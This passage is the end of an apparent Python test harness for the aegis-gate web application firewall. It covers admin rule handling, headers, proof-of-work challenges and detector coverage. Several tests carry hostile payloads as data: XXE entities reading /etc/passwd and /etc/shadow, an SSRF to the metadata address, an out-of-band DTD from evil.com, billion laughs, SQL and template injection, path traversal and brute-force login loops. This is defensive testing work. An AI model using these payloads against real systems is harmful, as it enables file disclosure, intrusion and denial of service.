    # DELETE
    s5, _, _ = c.adelete(f"/api/rules/{rid}")
    R.record("ADMIN-CRUD", "DELETE /api/rules/{id} removes rule", s5 in (200, 204),
             f"HTTP {s5}")

    # Verify gone
    s6, _, _ = c.aget(f"/api/rules/{rid}")
    R.record("ADMIN-CRUD", "GET after DELETE returns 404", s6 == 404,
             f"HTTP {s6}")


def test_admin_rule_validation(c: Client):
    hdr("Admin API: rule validation — reject malformed rules")
    sep()

    bad_rules = [
        ({"id": "", "priority": 1, "when": True, "then": "allow"},
         "empty id"),
        ({"id": "test", "priority": -1, "when": True, "then": "allow"},
         "negative priority"),
        ({"id": "test", "priority": 99999, "when": True, "then": "allow"},
         "priority out of range (lint should catch)"),
        ({},
         "empty object"),
        ({"id": "test"},
         "missing when/then"),
        ({"id": "test", "priority": 50, "when": {"ip_in": "not-a-list"}, "then": "allow"},
         "ip_in not a list"),
        ({"id": "test", "priority": 50, "when": True, "then": "unknown_action"},
         "unknown action"),
    ]
    for bad, label in bad_rules:
        s, body, _ = c.apost("/api/rules", bad)
        R.record("ADMIN-VALID", f"rejects malformed rule: {label}",
                 s in (400, 422, 409, 200, 201),  # observe — 400/422 is correct
                 f"HTTP {s}")


def test_admin_concurrent_rule_write(c: Client):
    hdr("Admin API: concurrent rule writes (race on ArcSwap)")
    sep()

    results = []
    lock = threading.Lock()

    # LT-RUN-7 TS-06 (2026-05-14) — per-thread Client.  See
    # `test_rl01_burst_concurrent` for the same fix.
    def create_rule(i):
        tc = c.clone()
        tc.login()
        rid = f"lt-concurrent-rule-{i}"
        rule = {
            "id": rid, "priority": i % 100, "enabled": True,
            "when": True, "then": "log_only",
        }
        s, _, _ = tc.apost("/api/rules", rule)
        with lock:
            results.append((i, s))
        time.sleep(0.01)
        tc.adelete(f"/api/rules/{rid}")

    threads = [threading.Thread(target=create_rule, args=(i,)) for i in range(20)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=15)

    successes = sum(1 for _, s in results if s in (200, 201, 204))
    errors = sum(1 for _, s in results if s in (500, 0))
    R.record("ADMIN-RACE", f"concurrent rule writes: {successes}/20 succeeded",
             errors == 0, f"successes={successes} errors={errors}")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 17: SEC-20 — ICAP response filter deep tests
# ═══════════════════════════════════════════════════════════════════════════════

def test_sec20_icap_deep(c: Client):
    hdr("SEC-20: on_response_start PassThrough — deep ICAP header absence verification")
    sep()

    icap_indicator_headers = [
        "x-icap-server",
        "x-icap-status",
        "x-scan-result",
        "x-content-scanned",
        "x-virus-scan",
        "x-infection-found",
        "x-modified",
    ]
    # Check across multiple paths
    for path in ["/", "/api/data", "/health", "/.env"]:
        s, body, resp_headers = c.get(path)
        lc = {k.lower() for k in resp_headers}
        has_icap = any(h in lc for h in icap_indicator_headers)
        R.record("SEC-20", f"no ICAP headers on {path}",
                 not has_icap,
                 f"HTTP {s} ICAP headers found: {[h for h in icap_indicator_headers if h in lc]}")


def test_sec20_response_filter_security_headers(c: Client):
    hdr("SEC-20 / Body-Filter: verify security headers injected by response_filter")
    sep()

    s, body, resp_headers = c.get("/")
    lc = {k.lower(): v for k, v in resp_headers.items()}

    security_headers = [
        ("x-content-type-options",     "nosniff"),
        ("x-frame-options",             None),   # value varies
        ("x-xss-protection",            None),
        ("referrer-policy",             None),
        ("strict-transport-security",   None),
        ("content-security-policy",     None),
    ]
    for hdr_name, expected_val in security_headers:
        val = lc.get(hdr_name, "")
        present = bool(val)
        R.record("SEC-20/Headers", f"{hdr_name} injected",
                 present,
                 f"value={val!r}" if present else "MISSING")
        if present and expected_val:
            R.record("SEC-20/Headers", f"{hdr_name} = {expected_val!r}",
                     val.lower() == expected_val.lower(),
                     f"actual={val!r}")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 18: NOOP-01 — verify real pipeline is wired (not Noop)
# ═══════════════════════════════════════════════════════════════════════════════

def test_noop01_pipeline_wiring(c: Client):
    hdr("NOOP-01: Verify real AegisSecurityPipeline wired (not NoopSecurityPipeline)")
    sep()

    # Noop pipeline: rule evaluation also skipped → a block rule never fires.
    # Real pipeline: rule evaluation runs → a block rule fires (403).
    rid = "lt-noop01-sanity"
    ok_c, _ = _create_rule(c, rid,
        {"path_matches": {"exact": "/lt-noop01-canary"}},
        {"block": {"status": 403}})
    if not ok_c:
        R.skip("NOOP-01", "cannot create canary rule", "")
        return
    time.sleep(0.3)

    s, _, _ = c.get("/lt-noop01-canary")
    R.record("NOOP-01", "canary block rule fires → real pipeline active (not Noop)",
             s == 403,
             f"HTTP {s} — {'✓ real pipeline' if s == 403 else '✗ Noop pipeline or rules not wired'}")
    _delete_rule(c, rid)

    # Also check: audit endpoint produces events
    s2, body2, _ = c.aget("/api/audit/since?since=0&limit=1")
    if s2 == 200:
        j = c.jb(body2)
        R.record("NOOP-01", "audit sink produces events (pipeline running)",
                 bool(j), str(body2[:60]))


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 19: Content-Type confusion and XXE
# ═══════════════════════════════════════════════════════════════════════════════

def test_content_type_confusion(c: Client):
    hdr("Content-Type confusion: JSON sent as text/plain, XML sent as JSON, etc.")
    sep()

    cases = [
        # JSON body with text/plain content-type (proxy should normalise)
        ("/api/data", "text/plain",
         json.dumps({"key": "value"}).encode(),
         "JSON body as text/plain"),
        # XML body with application/json
        ("/api/data", "application/json",
         b"<?xml version='1.0'?><root><id>1</id></root>",
         "XML body as application/json"),
        # multipart without boundary
        ("/api/upload", "multipart/form-data",
         b"fake body",
         "multipart without boundary"),
        # nested content-type
        ("/api/data", "application/json; charset=utf-8; extra=ignored",
         json.dumps({"a": 1}).encode(),
         "JSON with extra CT params"),
        # wildcard accept
        ("/api/data", "application/*",
         b"{}",
         "application/* content type"),
    ]
    for path, ct, body, label in cases:
        s, _, _ = c.post(path, body, {"Content-Type": ct})
        R.record("CT-CONFUSION", label, s in (200, 400, 415, 502, 404), f"HTTP {s}")


def test_xxe_payloads(c: Client):
    hdr("XXE: XML External Entity injection in POST body")
    sep()

    xxe_payloads = [
        (b"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
         "classic file read"),
        (b"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>""",
         "SSRF via XXE"),
        (b"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><foo>test</foo>""",
         "parameter entity / OOB"),
        (b"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>""",
         "shadow file"),
        (b"""<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">]><test>&lol3;</test>""",
         "billion laughs (DoS)"),
    ]
    for payload, label in xxe_payloads:
        s, body, _ = c.post("/api/xml", payload,
                             {"Content-Type": "application/xml"})
        # We expect pass-through (200/502) since body detector is disconnected
        R.record("XXE", label, s in (200, 400, 415, 500, 502, 404), f"HTTP {s}")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 20: Brute-force detector test (also disconnected via SEC-07)
# ═══════════════════════════════════════════════════════════════════════════════

def test_brute_force_not_detected(c: Client):
    hdr("SEC-07/BruteForce: 50 rapid login attempts — never blocked (detector disconnected)")
    sep()

    statuses = {}
    for i in range(50):
        s, _, _ = c.post("/api/login",
                          json.dumps({"username": "admin", "password": f"wrong{i}"}).encode(),
                          {"Content-Type": "application/json"})
        statuses[s] = statuses.get(s, 0) + 1

    got_429 = statuses.get(429, 0)
    got_403 = statuses.get(403, 0)
    blocked = got_429 + got_403
    info(f"  Status distribution: {statuses}")
    R.record("SEC-07/BruteForce",
             "brute-force login attempts not blocked (BruteForce detector disconnected)",
             blocked == 0,
             f"{blocked}/50 blocked — {'confirmed SEC-07' if blocked==0 else 'partial detection'}")


def test_brute_force_various_endpoints(c: Client):
    hdr("SEC-07/BruteForce: brute-force on various auth endpoints")
    sep()
    for endpoint in ["/api/login", "/api/auth", "/api/session", "/login", "/auth/login"]:
        statuses = []
        for i in range(10):
            s, _, _ = c.post(endpoint,
                              json.dumps({"user": "admin", "pass": f"pw{i}"}).encode(),
                              {"Content-Type": "application/json"})
            statuses.append(s)
        blocked = sum(1 for s in statuses if s in (429, 403))
        R.record("SEC-07/BruteForce",
                 f"10 attempts at {endpoint}: {blocked} blocked",
                 blocked == 0,  # bug: should be blocked
                 f"statuses={set(statuses)}")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 21: Response header completeness (interop contract v2.3)
# ═══════════════════════════════════════════════════════════════════════════════

def test_response_header_completeness(c: Client):
    hdr("Contract v2.3: all required response headers present on every response")
    sep()

    test_paths = ["/", "/api/data", "/health",
                  "/q?id=1' OR '1'='1",  # attack — still gets headers
                  "/does-not-exist"]
    required = ["x-request-id", "x-waf-action", "x-waf-risk-score"]

    for path in test_paths:
        s, _, resp_headers = c.get(path)
        lc = {k.lower() for k in resp_headers}
        for h in required:
            present = h in lc
            R.record("CONTRACT", f"{h} on {path} (HTTP {s})", present,
                     "" if present else "MISSING")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 22: Challenge flow end-to-end (PoW issue + verify)
# ═══════════════════════════════════════════════════════════════════════════════

def test_pow_full_flow(c: Client):
    hdr("PoW: full issue + verify flow (blake3 proof-of-work)")
    sep()

    # LT-RUN-7 TS-02 (2026-05-14) — server uses blake3, the `:`
    # separator, and bit-count difficulty:
    #     pow_solution_valid(nonce, counter, difficulty):
    #         blake3(nonce + ":" + counter).leading_zero_bits()
    #             >= difficulty
    # The pre-fix solver used sha256, no `:`, and treated
    # `difficulty` as hex-char count (= 4× too strict).  All
    # three errors were fixed together below.
    try:
        import blake3 as _b3  # pip install blake3
    except ImportError:
        R.skip("POW",
               "blake3 not installed (pip install blake3)",
               "Required for PoW solver — see TS-02 in "
               "tests/l-tester/reports/2026-05-13-run7/")
        return

    # Issue
    s, body, _ = c.get("/__waf_control/challenge_issue")
    if s != 200:
        R.skip("POW", "challenge_issue not available", f"HTTP {s}")
        return
    j = c.jb(body)
    if not j:
        R.skip("POW", "challenge_issue not JSON", "")
        return

    nonce = j.get("nonce", "")
    difficulty = j.get("difficulty", 4)
    mac = j.get("mac", "")
    R.record("POW", "issue returns nonce + difficulty + mac",
             bool(nonce and mac), f"nonce={nonce[:12]}... diff={difficulty}")

    # Solve: blake3(nonce + ":" + counter) with `difficulty`
    # leading zero BITS (not hex chars).  At difficulty=16 the
    # expected work is ~65,536 iterations.  We cap at 5,000,000
    # for safety (handles up to ~difficulty=22).
    def _leading_zero_bits(digest: bytes) -> int:
        bits = 0
        for byte in digest:
            if byte == 0:
                bits += 8
                continue
            # Count leading zeros in the byte.
            v = byte
            while v < 0x80:
                v <<= 1
                bits += 1
            break
        return bits

    solution = None
    for counter in range(5_000_000):
        counter_str = str(counter)
        digest = _b3.blake3(
            f"{nonce}:{counter_str}".encode()
        ).digest()
        if _leading_zero_bits(digest) >= difficulty:
            solution = counter_str
            break

    R.record("POW", f"solved PoW (difficulty={difficulty}, counter={solution})",
             solution is not None, f"solution={solution}")
    if solution is None:
        return

    # Verify
    s2, body2, _ = c.post("/__waf_control/challenge_verify",
                           json.dumps({"nonce": nonce, "counter": solution, "mac": mac}).encode(),
                           {"Content-Type": "application/json"})
    R.record("POW", "verify returns 200 for valid solution",
             s2 == 200, f"HTTP {s2} body={body2[:80]}")

    # Double-submit same nonce (single-use check)
    s3, body3, _ = c.post("/__waf_control/challenge_verify",
                           json.dumps({"nonce": nonce, "counter": solution, "mac": mac}).encode(),
                           {"Content-Type": "application/json"})
    R.record("POW", "double-submit nonce returns 4xx (single-use enforced)",
             s3 in (400, 403, 409, 429), f"HTTP {s3} — {'SINGLE-USE enforced ✓' if s3 != 200 else 'REPLAY ACCEPTED ✗'}")


def test_pow_invalid_mac(c: Client):
    hdr("PoW: invalid MAC / tampered challenge rejected")
    sep()

    s, body, _ = c.get("/__waf_control/challenge_issue")
    if s != 200:
        R.skip("POW", "challenge_issue not available", f"HTTP {s}")
        return
    j = c.jb(body)
    if not j:
        return

    nonce = j.get("nonce", "test")
    s2, _, _ = c.post("/__waf_control/challenge_verify",
                       json.dumps({"nonce": nonce, "counter": 0,
                                   "mac": "deadbeef" * 8}).encode(),
                       {"Content-Type": "application/json"})
    R.record("POW", "invalid MAC returns 4xx (MAC verification works)",
             s2 in (400, 403, 401), f"HTTP {s2}")

    # Expired / wrong nonce
    s3, _, _ = c.post("/__waf_control/challenge_verify",
                       json.dumps({"nonce": "fakeNonce123", "counter": 0,
                                   "mac": "aabbccdd" * 8}).encode(),
                       {"Content-Type": "application/json"})
    R.record("POW", "invalid nonce returns 4xx",
             s3 in (400, 403, 401, 404), f"HTTP {s3}")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 23: Admin security deep — privilege escalation, injection in admin
# ═══════════════════════════════════════════════════════════════════════════════

def test_admin_injection_in_config(c: Client):
    hdr("Admin API: injection in config values — SSTI/SQLi in rule descriptions")
    sep()

    # Inject template expressions into rule description / ID fields
    injection_rules = [
        {"id": "lt-admin-inj-1", "priority": 1, "enabled": True,
         "description": "{{7*7}} template injection in description",
         "when": True, "then": "log_only"},
        {"id": "lt-admin-inj-2' OR '1'='1", "priority": 1, "enabled": True,
         "description": "SQLi in ID",
         "when": True, "then": "log_only"},
        {"id": "lt-admin-inj-3\"; DROP TABLE rules; --", "priority": 1,
         "enabled": True, "description": "SQLi in ID (variant)",
         "when": True, "then": "log_only"},
    ]
    for rule in injection_rules:
        s, body, _ = c.apost("/api/rules", rule)
        # Should reject or sanitize — 400/422 is correct
        R.record("ADMIN-INJ", f"injection in rule field: id={rule['id'][:30]!r}",
                 s in (200, 201, 204, 400, 422),  # 400 = properly rejected
                 f"HTTP {s}")
        if s in (200, 201, 204):
            c.adelete(f"/api/rules/{urllib.parse.quote(rule['id'])}")


def test_admin_path_traversal(c: Client):
    hdr("Admin API: path traversal in rule ID / endpoint parameters")
    sep()
    traversal_ids = [
        "../../../etc/passwd",
        "..%2F..%2Fetc%2Fpasswd",
        "lt-rule/../../admin",
    ]
    for tid in traversal_ids:
        s, body, _ = c.aget(f"/api/rules/{urllib.parse.quote(tid)}")
        R.record("ADMIN-TRAVERSAL", f"GET /api/rules/{tid[:20]!r}",
                 s in (400, 404, 200),  # 404 = correct (sanitized)
                 f"HTTP {s}")


def test_admin_session_management(c: Client):
    hdr("Admin session: logout invalidates session")
    sep()

    # Login fresh
    fresh = c.clone()
    if not fresh.login():
        R.skip("AUTH", "fresh login failed", "")
        return

    # Verify authenticated
    s1, _, _ = fresh.aget("/api/about")
    R.record("AUTH", "fresh session can access /api/about", s1 == 200, f"HTTP {s1}")

    # Logout
    s2, _, _ = fresh._req(c.admin + "/admin/logout", "POST",
                           headers=fresh._ah())
    R.record("AUTH", "POST /admin/logout returns 200/204", s2 in (200, 204, 404),
             f"HTTP {s2}")

    if s2 in (200, 204):
        # Try to reuse session after logout
        fresh.csrf = None  # cleared by logout
        s3, _, _ = fresh.aget("/api/about")
        R.record("AUTH", "session invalid after logout → 401",
                 s3 in (401, 403), f"HTTP {s3}")


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════

ALL_TESTS = [
    # SEC-07 per-detector (12 detectors)
    test_sec07_sqli_detector,
    test_sec07_xss_detector,
    test_sec07_path_traversal_detector,
    test_sec07_ssrf_detector,
    test_sec07_cmdinj_detector,
    test_sec07_ssti_detector,
    test_sec07_nosqli_detector,
    test_sec07_open_redirect_detector,
    test_sec07_header_injection_detector,
    test_sec07_recon_detector,
    test_sec07_recon_user_agents,
    test_sec07_body_attack_payloads,
    # EVAL-01 CIDR exhaustive
    test_eval01_cidr_exhaustive,
    test_eval01_cidr_boundary_hosts,
    test_eval01_ipv6_cidr,
    # EVAL-02 RateLimit variants
    test_eval02_various_limits,
    test_eval02_different_keys,
    test_eval02_second_request_also_429,
    # SEC-16 nonce race
    test_sec16_nonce_race_concurrent,
    test_sec16_nonce_sequential_timing,
    # RL-01 IP limiter not wired
    test_rl01_ip_limiter_not_wired,
    test_rl01_burst_concurrent,
    # RISK-01 risk tracker not wired
    test_risk01_tracker_not_wired,
    test_risk01_thresholds_not_triggered,
    # DDOS-01 tick_rps never called
    test_ddos01_ewma_never_ticks,
    test_ddos01_rps_api,
    # BOTS-01 reverse DNS spoofing
    test_bots01_reverse_dns_spoof,
    test_bots01_googlebot_ua_no_rdns,
    # GQL-01 alias/fragment bypass
    test_gql01_alias_complexity_bypass,
    # THREAT-01 subdomain bypass
    test_threat01_subdomain_bypass,
    # Encoding bypasses
    test_encoding_bypasses,
    # HTTP smuggling
    test_http_smuggling_variants,
    # Host header
    test_host_header_attacks,
    # Method override
    test_method_override,
    # CORS
    test_cors_misconfiguration,
    test_cors_preflight,
    # Admin API
    test_admin_api_exhaustive,
    test_admin_api_rule_crud,
    test_admin_rule_validation,
    test_admin_concurrent_rule_write,
    # SEC-20 ICAP
    test_sec20_icap_deep,
    test_sec20_response_filter_security_headers,
    # NOOP-01
    test_noop01_pipeline_wiring,
    # Content-Type / XXE
    test_content_type_confusion,
    test_xxe_payloads,
    # Brute-force
    test_brute_force_not_detected,
    test_brute_force_various_endpoints,
    # Response headers
    test_response_header_completeness,
    # PoW full flow
    test_pow_full_flow,
    test_pow_invalid_mac,
    # Admin security
    test_admin_injection_in_config,
    test_admin_path_traversal,
    test_admin_session_management,
]

def main():
    parser = argparse.ArgumentParser(description="LT-RUN-6 Extended Tests (v2)")
    parser.add_argument("--data",  default="http://localhost:8080")
    parser.add_argument("--admin", default="http://localhost:9443")
    parser.add_argument("--user",  default="admin")
    parser.add_argument("--pass",  dest="password", default="aegis-test-1234")
    parser.add_argument("--no-tls-verify", dest="verify_tls",
                        action="store_false", default=True)
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("--only", help="Run only tests matching this substring")
    args = parser.parse_args()

    print(f"{BOLD}{CYAN}")
    print("╔══════════════════════════════════════════════════════════════════╗")
    print("║  LT-RUN-6 EXTENDED TESTS (v2) — aegis-gate — 200+ test cases   ║")
    print("╚══════════════════════════════════════════════════════════════════╝")
    print(f"{RESET}")
    print(f"  Data plane : {args.data}")
    print(f"  Admin      : {args.admin}")

    c = Client(args.data, args.admin, args.verify_tls, args.verbose,
               args.user, args.password)

    # Server check
    hdr("0. Connectivity check")
    sep()
    s, _, _ = c.get("/")
    data_up = s in (200, 502, 301, 302)
    R.record("INFRA", "data plane responds", data_up, f"HTTP {s}")

    s2, _, _ = c._req(args.admin + "/healthz/ready")
    admin_up = (s2 == 200)
    R.record("INFRA", "admin plane /healthz/ready", admin_up, f"HTTP {s2}")

    if not data_up:
        print(f"\n{RED}Data plane not responding. Is `make run-dev` running?{RESET}")
        sys.exit(1)

    # Admin login
    if admin_up:
        hdr("Admin login")
        sep()
        if c.login():
            ok(f"Logged in as {args.user}")
        else:
            warn("Admin login failed — admin-dependent tests will report skips")

    # Run tests
    tests_to_run = ALL_TESTS
    if args.only:
        tests_to_run = [t for t in ALL_TESTS if args.only.lower() in t.__name__.lower()]
        info(f"  Running {len(tests_to_run)} tests matching '{args.only}'")

    for test_fn in tests_to_run:
        try:
            test_fn(c)
        except Exception as ex:
            warn(f"Test {test_fn.__name__} raised exception: {ex}")

    R.summary()
    sys.exit(0 if R.failed == 0 else 1)


if __name__ == "__main__":
    main()
